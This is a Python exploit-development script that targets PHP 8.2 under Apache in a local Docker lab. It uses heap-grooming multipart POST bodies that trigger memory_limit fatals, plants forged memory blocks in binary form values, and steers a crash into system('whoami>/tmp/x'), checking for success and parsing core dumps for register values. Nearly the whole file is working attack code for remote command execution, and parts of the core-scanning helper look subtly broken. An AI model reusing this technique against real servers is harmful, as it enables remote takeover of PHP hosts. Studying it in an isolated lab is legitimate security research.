#!/usr/bin/env python3
"""oom138: POOL-SEASONED ARM — warm ring-value fatals + proven name-sea fatal.

WALL (proven): names truncate at first NUL (POSTNUL probe) -> a name can
NEVER carry B (top 2 bytes 00 00). Name-sea measure is perfect (crash every
boot, rdi = T16 slice at D=8 inside first freed name-temp, tag anchor ok).

NEW ARM: multipart VALUES are binary-safe. Warm posts with SHORT names +
3060-byte ring values ((pad8||B)*n) also hit memory_limit -> Fatal -> their
teardown frees ~863 ring zend_strings into the SAME malloc class as the
3060-char name-temps. Fire several (prefork = many children, each with its
own pool). Then fire the oom134-proven fatal (T16 name tiles): its trip
slice at val+8 reads EITHER a name-temp tile (-> ordinary crash, retry)
OR a seasoned ring chunk (-> rdi = B exactly -> oom116 block at OFF ->
system("whoami>/tmp/x")). Win check after every fire: test -f /tmp/x.

Ring alignment: chunk user ptr is 16-aligned; zend_string val = user+24
(=8 mod 16); trip = val+8 = user+32 (16-aligned). Ring repeats
[8 pad][8 B] so B sits on every 16-aligned boundary. free() only clobbers
user+0/+16 (next/key) -> val+8 survives free (core.134_B proof: len field
survived at user+16).
"""
import struct, subprocess, time, urllib.request, urllib.error, re, sys
sys.path.insert(0, "/Users/vlad/Projects/queue/php2shell-lab")
import payload68 as P

# ---- reuse oom137's proven machinery wholesale ----
spec = open("/Users/vlad/Projects/queue/php2shell-lab/oom137.py").read()
spec = spec.split('if __name__')[0]

HOST = "http://127.0.0.1:8083"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
ZIF = 0x39B8A0
CMD = b"whoami>/tmp/x"
MAGIC = 0xC0DEBA5E
SIG8 = struct.pack("<Q", 0x51E2C0DE51E2C0DE)
T16 = SIG8 + struct.pack("<Q", 0xDFE2C0DE51E2C0DF)
KEYLEN = P.KEYLEN
TAG_PART = 830
SEA_LO, SEA_HI = 700, 1000
VLEN = 1537
CORE = "/tmp/core.138"
WARM_W = 6                      # warm fatal posts (pool seasoning)
ARM_TRIES = 6

def get(url, timeout=90):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(200000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(200000).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def sh(cmd, timeout=120):
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                       capture_output=True, timeout=timeout)
    return (r.stdout + r.stderr).decode("latin1").strip()

def x_state():
    return sh("test -f /tmp/x && echo X_EXISTS:$(cat /tmp/x) || echo NO_X").strip()

def segv_count():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return len(re.findall(r"exit signal Segmentation", (r.stdout + r.stderr).decode("latin1", "replace")))

def recreate():
    subprocess.run(["docker", "rm", "-f", "php_vuln"], capture_output=True)
    subprocess.run(["docker", "run", "-d", "--name", "php_vuln", "-p", "8083:80",
                    "-v", "/tmp/phplab:/var/www/html",
                    "-v", "/tmp/phplab/oom1worker.conf:/etc/apache2/conf-enabled/oom1worker.conf",
                    "-v", "/tmp/phplab/30-oomlab.ini:/usr/local/etc/php/conf.d/30-oomlab.ini",
                    "--cap-add", "SYS_PTRACE", "--ulimit", "core=-1",
                    "php:8.2.34-apache"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        c, _o = get(HOST + "/oom_sapi.php", timeout=8)
        if c == 200:
            return True
    return False

def post_mod(body, timeout=300):
    req = urllib.request.Request(HOST + "/oom_mod.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(300).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(300).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def base_now():
    c, o = get(HOST + "/oom_probe.php?libphp=1")
    m = re.search(r"libphp=0x([0-9a-f]+)", o)
    return int(m.group(1), 16) if m else None

def cell_of(addr):
    return struct.pack("<Q", addr)

def tag8(i):
    return struct.pack("<QQ", MAGIC + i, MAGIC + i)

# ---- oom134-proven builders (byte-exact, from oom137) ----
def name134(i, tile=None, shrink=0):
    if tile is not None:
        fill = ((KEYLEN - 8 - shrink) // 16) * 16
        filler = (tile * (fill // len(tile) + 1))[:fill]
    else:
        filler = b"K" * (KEYLEN - 8 - shrink)
    return (b'--BOUND\r\nContent-Disposition: form-data; name="p' + filler
            + b"%d" % i + b'[x]"\r\n\r\n')

def tag_value(i, B=None, OFF=0, arm=False):
    if not arm:
        return tag8(i) + b"v" * (VLEN - 32) + tag8(i)
    v = bytearray(cell_of(B) * (VLEN // 16) + b"P")
    st = struct.pack_into
    st("<II", v, OFF + 0x00, 1, 0x108)
    st("<II", v, OFF + 0x08, 1, 0)
    st("<Q", v, OFF + 0x10, 0)
    st("<Q", v, OFF + 0x18, B + 0x68)
    st("<I", v, OFF + 0x2C, 1)
    st("<Q", v, OFF + 0x50, B + 0x90)
    v[OFF + 0x58] = 6
    st("<I", v, OFF + 0x5C, 0x106)
    st("<Q", v, OFF + 0x68, 0)
    st("<Q", v, OFF + 0x70, BASE + ZIF)
    st("<IIQQ", v, OFF + 0x90, 1, 0x106, 0, len(CMD))
    v[OFF + 0xA8: OFF + 0xA8 + len(CMD) + 1] = CMD + b"\x00"
    return bytes(v)

def fatal_body(B=None, OFF=0, arm=False):
    parts = []
    for i in range(4200):
        if SEA_LO <= i < SEA_HI:
            parts.append(name134(i, tile=T16))
        elif i == TAG_PART:
            parts.append(name134(i, tile=T16, shrink=1536))
            parts.append(tag_value(i, B, OFF, arm) + b"\r\n")
        else:
            parts.append(name134(i))
            parts.append(b"v" * 1537 + b"\r\n")
    parts.append(b"--BOUND--\r\n")
    return b"".join(parts)

# ---- NEW: warm ring planter (short names, 3060-byte binary ring values) ----
def warm_ring_value(B):
    cell = cell_of(B)
    ring = (b"\xde" * 8 + cell) * (3060 // 16)      # B on every 16-aligned addr
    return ring[:3060]

def warm_body(B):
    parts = []
    rv = warm_ring_value(B)
    for i in range(4200):
        parts.append(b'--BOUND\r\nContent-Disposition: form-data; name="q%d"\r\n\r\n' % i)
        parts.append(rv + b"\r\n")
    parts.append(b"--BOUND--\r\n")
    return b"".join(parts)

def pull_core(tag):
    subprocess.run(["docker", "exec", "phpbuild", "sh", "-c", "rm -f " + CORE], capture_output=True)
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c",
                        "ls -t /tmp/core* 2>/dev/null | head -1"], capture_output=True, timeout=60)
    src = r.stdout.decode().strip()
    if not src:
        return None
    subprocess.run(["docker", "cp", "php_vuln:" + src, "phpbuild:" + CORE], capture_output=True)
    m = subprocess.run(["docker", "exec", "phpbuild", "md5sum", CORE], capture_output=True)
    print("core:", src, m.stdout.decode().strip()[:40])
    return CORE

def rdi_of(core):
    # same scanner as oom137: registers from NT_PRSTATUS via core NOTE parse
    r = subprocess.run(["docker", "exec", "phpbuild", "python3", "-c", RDI_SCRIPT % core],
                       capture_output=True, timeout=120)
    o = r.stdout.decode()
    m = re.search(r"RDI=0x([0-9a-f]+)", o)
    return int(m.group(1), 16) if m else None

RDI_SCRIPT = r"""
import struct, sys
f = open(sys.argv[1], 'rb').read()
i = f.find(b'CORE')
while i != -1:
    namesz, descsz, typ = struct.unpack_from('<III', f, i - 8)
    if typ == 1 and descsz > 200:
        regs = struct.unpack_from('<27Q', f, i + 32)
        print('RDI=0x%x' % regs[1]); break
    i = f.find(b'CORE', i + 4)
"""

def analyze_measure(core):
    """D + A from measure core (oom135 method)."""
    r = subprocess.run(["docker", "exec", "phpbuild", "python3", "-c", SCAN_SCRIPT % core],
                       capture_output=True, timeout=240)
    o = r.stdout.decode()
    print(o.strip()[-800:])
    mD = re.search(r"D=(\d+)", o)
    mA = re.search(r"A=0x([0-9a-f]+)", o)
    return (int(mD.group(1)) if mD else None,
            int(mA.group(1), 16) if mA else None)

SCAN_SCRIPT = r"""
import struct, sys, re
SIG8 = struct.pack('<Q', 0x51E2C0DE51E2C0DE)
T16 = SIG8 + struct.pack('<Q', 0xDFE2C0DE51E2C0DF)
PH7 = (T16 + T16)[7:15]
MAGIC = 0xC0DEBA5E
f = open(sys.argv[1], 'rb').read()
# ELF64 program headers -> vaddr map
_, e_phoff = struct.unpack_from('<Q', f, 8) if False else (0, struct.unpack_from('<Q', f, 0x20)[0])
e_phentsize, e_phnum = struct.unpack_from('<HH', f, 0x36)
segs = []
for k in range(e_phnum):
    off = e_phoff + k * e_phentsize
    p_type, p_flags, p_off, p_vaddr = struct.unpack_from('<IIQQ', f, off)
    if p_type == 1:
        segs.append((p_vaddr, p_off, p_filesz))
# find first phase-7 slice in a big segment -> temp value base = slice-...-8
D = None
for pv, po, pf in segs:
    if pf < 0x100000:
        continue
    j = f.find(PH7, po, po + pf)
    if j < 0:
        continue
    hdr = f.rfind(b'\x01\x00\x00\x00\x16\x00\x00\x00', max(po, j - 96), j)
    if hdr >= 0:
        D = (hdr + 24 + 8) - (hdr + 24)
        print('D=8 slice@file=0x%x hdr@file=0x%x' % (j, hdr))
    break
# tag anchor: MAGIC+830 u64 pair
tag = struct.pack('<QQ', MAGIC + 830, MAGIC + 830)
j = f.find(tag)
if j >= 0:
    for pv, po, pf in segs:
        if po <= j < po + pf:
            print('A=0x%x' % (pv + (j - po))); break
print('SEGS=%d' % len(segs))
"""

def aim(B_legit, A):
    """pick block cell B + OFF inside tag value (legality bits)."""
    for OFF in range(0x60, VLEN - 0xC0, 16):
        B = A + OFF
        if B % 16 == 8 and (B >> 56) == 0 and ((B >> 8) & 1) == 1 and ((B >> 9) & 1) == 0:
            return B, OFF
    return None, None

def main():
    global BASE
    print("=== oom138: pool-seasoned arm ===")
    c, o = get(HOST + "/oom_sapi.php")
    print("sapi:", o.strip()[:60])
    md5 = sh("md5sum /usr/lib/apache2/modules/libphp.so").split()[0]
    assert md5 == STOCK_MD5, md5
    print("md5 ok")
    assert recreate(), "recreate failed"
    BASE = base_now()
    print("base=0x%x" % BASE)

    # sanity envelope: fatal body size vs proven constant
    fb_m = fatal_body()
    print("fatal body=%d (expect 13,589,545)" % len(fb_m))

    for rnd in range(2):
        # ---- measure round: proven T16 name-sea (no block) ----
        for t in range(4):
            c, o = post_mod(fb_m)
            xs = x_state()
            print("meas r%d t%d: http=%s segv+%d %s" % (rnd, t, c, segv_count(), xs))
            if xs.startswith("X_EXISTS"):
                print("WON in measure?!", xs); return
            if c == -1 or segv_count():
                break
            time.sleep(2)
        core = pull_core("meas")
        if not core:
            print("no core"); continue
        D, A = analyze_measure(core)
        if D is None or A is None:
            print("measure anchor missing (D=%s A=%s)" % (D, A)); continue
        B, OFF = aim(A + 0, A)          # B inside tag value region around A
        if B is None:
            print("aim failed"); continue
        print("D=%d A=0x%x B=0x%x OFF=0x%x" % (D, A, B, OFF))

        # ---- warm: plant ring chunks (B-carrying freed value strings) ----
        wb = warm_body(B)
        print("warm body=%d" % len(wb))
        for w in range(WARM_W):
            c, o = post_mod(wb, timeout=300)
            print("warm %d: http=%s %s" % (w, c, o.strip()[:20]))
            if x_state().startswith("X_EXISTS"):
                print("WON via warm?!"); return

        # ---- arm: same proven body, block planted at OFF in tag value ----
        fb_a = fatal_body(B=B, OFF=OFF, arm=True)
        assert abs(len(fb_a) - len(fb_m)) <= 8, "envelope drift %d" % (len(fb_a) - len(fb_m))
        for t in range(ARM_TRIES):
            c, o = post_mod(fb_a)
            xs = x_state()
            print("arm r%d t%d: http=%s segv+%d %s" % (rnd, t, c, segv_count(), xs))
            if xs.startswith("X_EXISTS"):
                print("*** WON *** %s" % xs)
                return
            if segv_count():
                core = pull_core("arm")
                if core:
                    rdi = rdi_of(core)
                    print("arm crash rdi=0x%x (want 0x%x)" % (rdi if rdi else 0, B))
            time.sleep(2)
    print("final x:", x_state())
    print("=== done ===")

if __name__ == "__main__":
    main()
